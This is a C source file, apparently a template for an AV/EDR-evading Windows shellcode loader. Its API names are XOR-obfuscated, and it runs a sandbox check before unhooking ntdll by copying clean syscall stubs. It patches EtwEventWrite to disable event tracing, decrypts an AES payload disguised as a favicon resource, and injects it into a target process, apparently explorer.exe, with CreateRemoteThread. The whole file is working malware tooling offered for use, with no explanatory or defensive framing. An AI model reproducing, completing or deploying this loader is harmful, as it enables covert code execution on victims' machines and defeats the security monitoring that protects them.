#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "resources.h"

char AES_KEY[] = REPLACE_ME_AESKEY_STR
char XOR_KEY[] = REPLACE_ME_XORKEY_STR


// OBFUSCATED FUNCTION DEFINITIONS START
    /* kernel32.dll */
LPVOID (WINAPI * pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

DWORD (WINAPI * pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD dwMilliseconds
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
    DWORD dwFlags,
    DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pCloseHandle)(
    HANDLE hObject
);

HANDLE (WINAPI * pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);
BOOL (WINAPI * pCreateProcessA)(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

LPVOID (WINAPI * pVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

BOOL (WINAPI * pReadProcessMemory)(
    HANDLE  hProcess,
    LPCVOID lpBaseAddress,
    LPVOID  lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesRead
);

BOOL (WINAPI * pTerminateProcess)(
    HANDLE hProcess,
    UINT   uExitCode
);

BOOL (WINAPI * pVirtualFree)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  dwFreeType
);
BOOL (WINAPI * pVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);
BOOL (WINAPI * pVirtualProtectEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);
BOOL (WINAPI * pFlushInstructionCache)(
    HANDLE  hProcess,
    LPCVOID lpBaseAddress,
    SIZE_T  dwSize
);
    /* advapi32.dll */
BOOL (WINAPI * pCryptAcquireContextW)(
    HCRYPTPROV *phProv,
    LPCWSTR szContainer,
    LPCWSTR szProvider,
    DWORD dwProvType,
    DWORD dwFlags
);

BOOL (WINAPI * pCryptCreateHash)(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTKEY hKey,
    DWORD dwFlags,
    HCRYPTHASH *phHash
);

BOOL (WINAPI * pCryptHashData)(
    HCRYPTHASH hHash,
    const BYTE *pbData,
    DWORD dwDataLen,
    DWORD dwFlags
);

BOOL (WINAPI * pCryptDeriveKey)(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTHASH hBaseData,
    DWORD dwFlags,
    HCRYPTKEY *phKey
);

BOOL (WINAPI * pCryptDecrypt)(
    HCRYPTKEY hKey,
    HCRYPTHASH hHash,
    BOOL Final,
    DWORD dwFlags,
    BYTE *pbData,
    DWORD *pdwDataLen
);

BOOL (WINAPI * pCryptReleaseContext)(
    HCRYPTPROV hProv,
    DWORD dwFlags
);

BOOL (WINAPI * pCryptDestroyHash)(
    HCRYPTHASH hHash
);

BOOL (WINAPI * pCryptDestroyKey)(
    HCRYPTKEY hKey
);
HMODULE (WINAPI * pLoadLibraryA)(
    LPCSTR lpLibFileName
);
// OBFUSCATED FUNCTION DEFINITIONS END

// CRYPTOGRAPHIC FUNCTIONS START
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j = 0;

    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[j];
        j++;
        if (j == key_len) j = 0;
    }
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    // Function Call Obfuscation block start
    unsigned char skernel32[] = REPLACE_ME_KERNEL32_STR
    unsigned char sadvapi32[] = REPLACE_ME_ADVAPI32_STR
    unsigned char sCryptAcquireContextW[] = REPLACE_ME_CRYPTACQUIRECONTEXTW_STR
    unsigned char sCryptCreateHash[] = REPLACE_ME_CRYPTCREATEHASH_STR
    unsigned char sCryptHashData[] = REPLACE_ME_CRYPTHASHDATA_STR
    unsigned char sCryptDeriveKey[] = REPLACE_ME_CRYPTDERIVEKEY_STR
    unsigned char sCryptDecrypt[] = REPLACE_ME_CRYPTDECRYPT_STR
    unsigned char sCryptReleaseContext[] = REPLACE_ME_CRYPTRELEASECONTEXT_STR
    unsigned char sCryptDestroyHash[] = REPLACE_ME_CRYPTDESTROYHASH_STR
    unsigned char sCryptDestroyKey[] = REPLACE_ME_CRYPTDESTROYKEY_STR
    unsigned char sLoadLibraryA[] = REPLACE_ME_LOADLIBRARYA_STR

    XOR((char *) sadvapi32, sizeof(sadvapi32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) skernel32, sizeof(skernel32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptAcquireContextW, sizeof(sCryptAcquireContextW), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptCreateHash, sizeof(sCryptCreateHash), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptHashData, sizeof(sCryptHashData), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptDeriveKey, sizeof(sCryptDeriveKey), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptReleaseContext, sizeof(sCryptReleaseContext), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptDecrypt, sizeof(sCryptDecrypt), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptDestroyHash, sizeof(sCryptDestroyHash), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCryptDestroyKey, sizeof(sCryptDestroyKey), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sLoadLibraryA, sizeof(sLoadLibraryA), XOR_KEY, sizeof(XOR_KEY));

    // LOAD advapi32.dll dynamically cause I want to do it like that lol.
    pLoadLibraryA = GetProcAddress(GetModuleHandle(skernel32), sLoadLibraryA);
    LPCSTR dll_name = sadvapi32; 
    HINSTANCE hinstLib;
    hinstLib = pLoadLibraryA(dll_name);

    pCryptAcquireContextW = GetProcAddress(GetModuleHandle(sadvapi32), sCryptAcquireContextW);
    pCryptCreateHash = GetProcAddress(GetModuleHandle(sadvapi32), sCryptCreateHash);
    pCryptHashData = GetProcAddress(GetModuleHandle(sadvapi32), sCryptHashData);
    pCryptDeriveKey = GetProcAddress(GetModuleHandle(sadvapi32), sCryptDeriveKey);
    pCryptDecrypt = GetProcAddress(GetModuleHandle(sadvapi32), sCryptDecrypt);
    pCryptReleaseContext = GetProcAddress(GetModuleHandle(sadvapi32), sCryptReleaseContext);
    pCryptDestroyHash = GetProcAddress(GetModuleHandle(sadvapi32), sCryptDestroyHash);
    pCryptDestroyKey = GetProcAddress(GetModuleHandle(sadvapi32), sCryptDestroyKey);
   // Function Call Obfuscation block end

    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        return -1;
    }
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;
    }
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
        return -1;
    }

    if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
        return -1;
    }

    pCryptReleaseContext(hProv, 0);
    pCryptDestroyHash(hHash);
    pCryptDestroyKey(hKey);

    return 0;
}
// CRYPTOGRAPHIC FUNCTIONS END

// INJECTION FUNCTIONS START
int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    // Function Call Obfuscation block start
    unsigned char skernel32[] = REPLACE_ME_KERNEL32_STR
    unsigned char sCreateToolhelp32Snapshot[] = REPLACE_ME_CREATETOOLHELP32SNAPSHOT_STR
    unsigned char sProcess32First[] = REPLACE_ME_PROCESS32FIRST_STR
    unsigned char sProcess32Next[] = REPLACE_ME_PROCESS32NEXT_STR
    unsigned char sCloseHandle[] = REPLACE_ME_CLOSEHANDLE_STR

    XOR((char *) skernel32, sizeof(skernel32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sProcess32First, sizeof(sProcess32First), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sProcess32Next, sizeof(sProcess32Next), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCloseHandle, sizeof(sCloseHandle), XOR_KEY, sizeof(XOR_KEY));

    pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(skernel32), sCreateToolhelp32Snapshot);
    pProcess32First = GetProcAddress(GetModuleHandle(skernel32), sProcess32First);
    pProcess32Next = GetProcAddress(GetModuleHandle(skernel32), sProcess32Next);
    pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
    // Function Call Obfuscation block end

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
    pe32.dwSize = sizeof(PROCESSENTRY32); 
    if (!pProcess32First(hProcSnap, &pe32)) {
        pCloseHandle(hProcSnap);
        return 0;
    }
    while (pProcess32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    pCloseHandle(hProcSnap);
    return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    DWORD oldprotect = 0;

    // Function Call Obfuscation block start
    unsigned char skernel32[] = REPLACE_ME_KERNEL32_STR
    unsigned char sVirtualAllocEx[] = REPLACE_ME_VIRTUALALLOCEX_STR
    unsigned char sWriteProcessMemory[] = REPLACE_ME_WRITEPROCESSMEMORY_STR
    unsigned char sWaitForSingleObject[] = REPLACE_ME_WAITFORSINGLEOBJECT_STR
    unsigned char sCloseHandle[] = REPLACE_ME_CLOSEHANDLE_STR
    unsigned char sVirtualProtectEx[] = REPLACE_ME_VIRTUALPROTECTEX_STR
    unsigned char sCreateRemoteThread[] = REPLACE_ME_CREATEREMOTETHREAD_STR

    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) skernel32, sizeof(skernel32), XOR_KEY, sizeof(XOR_KEY)); 
    XOR((char *) sVirtualProtectEx, sizeof(sVirtualProtectEx), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCloseHandle, sizeof(sCloseHandle), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), XOR_KEY, sizeof(XOR_KEY));

    pVirtualAllocEx = GetProcAddress(GetModuleHandle(skernel32), sVirtualAllocEx);
    pVirtualProtectEx = GetProcAddress(GetModuleHandle(skernel32), sVirtualProtectEx);
    pWriteProcessMemory = GetProcAddress(GetModuleHandle(skernel32), sWriteProcessMemory);
    pWaitForSingleObject = GetProcAddress(GetModuleHandle(skernel32), sWaitForSingleObject);
    pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
    pCreateRemoteThread = GetProcAddress(GetModuleHandle(skernel32), sCreateRemoteThread);
    // Function Call Obfuscation block end

    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_READWRITE);
    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
    pVirtualProtectEx(hProc, pRemoteCode, (SIZE_T)payload_len, PAGE_EXECUTE, &oldprotect);
    hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        pWaitForSingleObject(hThread, 2000);
        pCloseHandle(hThread);
        return 0;
    }
    return -1;
}
// INJECTION FUNCTIONS END

// EVASION FUNCTIONS START
BOOL CheckSandbox() {
    SIZE_T heapSize = 235929600; // 225 mb heap
    HANDLE hHeap = NULL;
    LPVOID lpHeap = NULL;

    hHeap = HeapCreate(0, 157286400, 0);
    if (hHeap == NULL){
        return 127;
    };
    lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, heapSize);
    if (lpHeap == NULL){
        return 127;
    };
    memset(lpHeap, 0x43, heapSize);
    HeapDestroy(hHeap);

    return 0;
};

int FindFirstSyscall(char * pMem, DWORD size){
    DWORD i = 0;
    DWORD offset = 0;
    BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
    BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3

    // find the first syscall+ret instruction
    for (i = 0; i < size - 3; i++) {
        if (!memcmp(pMem + i, pattern1, 3)) {
            offset = i;
            break;
        }
    }

    // find the beginning of the syscall
    for (i = 3; i < 50 ; i++) {
        if (!memcmp(pMem + offset - i, pattern2, 3)) {
            offset = offset - i + 3;
            break;
        }
    }

    return offset;
}


int FindLastSysCall(char * pMem, DWORD size) {
    DWORD i;
    DWORD offset = 0;
    BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3

    for (i = size - 9; i > 0; i--) {
        if (!memcmp(pMem + i, pattern, 9)) {
            offset = i + 6;
            break;
        }
    }
    return offset;
}


static int UnhookNtdll() {
    // Function Call Obfuscation block start
    unsigned char skernel32[] = REPLACE_ME_KERNEL32_STR
    unsigned char sVirtualProtect[] = REPLACE_ME_VIRTUALPROTECT_STR
    unsigned char sntdll[] = REPLACE_ME_NTDLL_STR
    unsigned char sCreateProcessA[] = REPLACE_ME_CREATEPROCESSA_STR
    unsigned char sVirtualAlloc[] = REPLACE_ME_VIRTUALALLOC_STR
    unsigned char sReadProcessMemory[] = REPLACE_ME_READPROCESSMEMORY_STR
    unsigned char sTerminateProcess[] = REPLACE_ME_TERMINATEPROCESS_STR
    unsigned char sVirtualFree[] = REPLACE_ME_VIRTUALFREE_STR
    unsigned char sPathOfSystem32[] =  REPLACE_ME_SYSTEM32PATH_STR
    unsigned char scmd[] = REPLACE_ME_CMD_STR
    unsigned char stext[] = REPLACE_ME_TEXT_STR

    XOR((char *) skernel32, sizeof(skernel32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sntdll, sizeof(sntdll), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sVirtualProtect, sizeof(sVirtualProtect), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCreateProcessA, sizeof(sCreateProcessA), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sVirtualAlloc, sizeof(sVirtualAlloc), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sReadProcessMemory, sizeof(sReadProcessMemory), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sTerminateProcess, sizeof(sTerminateProcess), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sVirtualFree, sizeof(sVirtualFree), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sPathOfSystem32, sizeof(sPathOfSystem32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) scmd, sizeof(scmd), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) stext, sizeof(stext), XOR_KEY, sizeof(XOR_KEY));

    pCreateProcessA = GetProcAddress(GetModuleHandle(skernel32), sCreateProcessA);
    pVirtualAlloc = GetProcAddress(GetModuleHandle(skernel32), sVirtualAlloc);
    pReadProcessMemory = GetProcAddress(GetModuleHandle(skernel32), sReadProcessMemory);
    pTerminateProcess = GetProcAddress(GetModuleHandle(skernel32), sTerminateProcess);
    pVirtualFree = GetProcAddress(GetModuleHandle(skernel32), sVirtualFree);
    pVirtualProtect = GetProcAddress(GetModuleHandle(skernel32), sVirtualProtect);
    // Function Call Obfuscation block end

    // Create process with unhooked ntdll
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    BOOL success = pCreateProcessA(NULL, (LPSTR) scmd, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, sPathOfSystem32, &si, &pi);

    if (success == FALSE) {
        return 127;
    }

    // Get clean image
    char * pNtdllAddr = (char *) GetModuleHandle(sntdll);
    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
    LPVOID pCache = pVirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);

    SIZE_T bytesRead = 0;
    if (!pReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
        return 127;
    pTerminateProcess(pi.hProcess, 0);

    // Parsing pCache
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);

    HMODULE hNtdll = GetModuleHandle((LPCSTR) sntdll);
    DWORD oldprotect = 0;
    int i;

    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *)pImgSectionHead->Name, stext)) {
            pVirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress), pImgSectionHead->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                    return 127;
            }
            // copy clean syscall table into our ntdll
            DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
            DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;
                memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start), (LPVOID)((DWORD_PTR) pCache + + SC_start), SC_size);
            }
            // restore oldprotect of ntdll
            pVirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress), pImgSectionHead->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                    return 127;
            }
            pVirtualFree(pCache, 0, MEM_RELEASE);
            return 0;
        }
    }
    return 127;
}


int PatchETW(void) {

    DWORD oldprotect = 0;
    // Function Call Obfuscation block start
    unsigned char sntdll[] = REPLACE_ME_NTDLL_STR
    unsigned char skernel32[] = REPLACE_ME_KERNEL32_STR
    unsigned char sEtwEventWrite[] = REPLACE_ME_ETWEVENTWRITE_STR
    unsigned char sVirtualProtect[] = REPLACE_ME_VIRTUALPROTECT_STR
    unsigned char sFlushInstructionCache[] = REPLACE_ME_FLUSHINSTRUCTIONCACHE_STR

    XOR((char *) sntdll, sizeof(sntdll), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) skernel32, sizeof(skernel32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sEtwEventWrite, sizeof(sEtwEventWrite), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sVirtualProtect, sizeof(sVirtualProtect), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sFlushInstructionCache, sizeof(sFlushInstructionCache), XOR_KEY, sizeof(XOR_KEY));

    pVirtualProtect = GetProcAddress(GetModuleHandle(skernel32), sVirtualProtect);
    pFlushInstructionCache = GetProcAddress(GetModuleHandle(skernel32), sFlushInstructionCache);
    void * pEventWrite = GetProcAddress(GetModuleHandle(sntdll), (LPCSTR) sEtwEventWrite);
    // Function Call Obfuscation block end

    pVirtualProtect(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

    #ifdef _WIN64
        memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);             // xor rax, rax; ret
    #else
        memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);         // xor eax, eax; ret 14
    #endif

    pVirtualProtect(pEventWrite, 4096, oldprotect, &oldprotect);
    pFlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
    return 0;
}
// EVASION FUNCTIONS END


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    if(CheckSandbox()==127){
        return 127;
    };
    if(UnhookNtdll()==127){
        return 127;
    };
    if(PatchETW()==127){
        return 127;
    };

    // extract payload from resources.
    HGLOBAL resHandle = NULL;
    HRSRC res;
    unsigned char * payload;
    unsigned int payload_len;

    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL, res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);

    // Function Call Obfuscation block start
    unsigned char skernel32[] = REPLACE_ME_KERNEL32_STR
    unsigned char sCloseHandle[] = REPLACE_ME_CLOSEHANDLE_STR
    unsigned char sOpenProcess[] = REPLACE_ME_OPENPROCESS_STR
    unsigned char sTarget[] = REPLACE_ME_EXPLORER_STR

    XOR((char *) skernel32, sizeof(skernel32), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sTarget, sizeof(sTarget), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sCloseHandle, sizeof(sCloseHandle), XOR_KEY, sizeof(XOR_KEY));
    XOR((char *) sOpenProcess, sizeof(sOpenProcess), XOR_KEY, sizeof(XOR_KEY));

    pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
    pOpenProcess = GetProcAddress(GetModuleHandle(skernel32), sOpenProcess);
    // Function Call Obfuscation block end

    AESDecrypt(payload, payload_len, AES_KEY, sizeof(AES_KEY));

    int pid = 0;
    HANDLE hProc = NULL;

    pid = FindTarget(sTarget);
    if (pid) {
        hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            pCloseHandle(hProc);
        }
    }
    return 0;
}
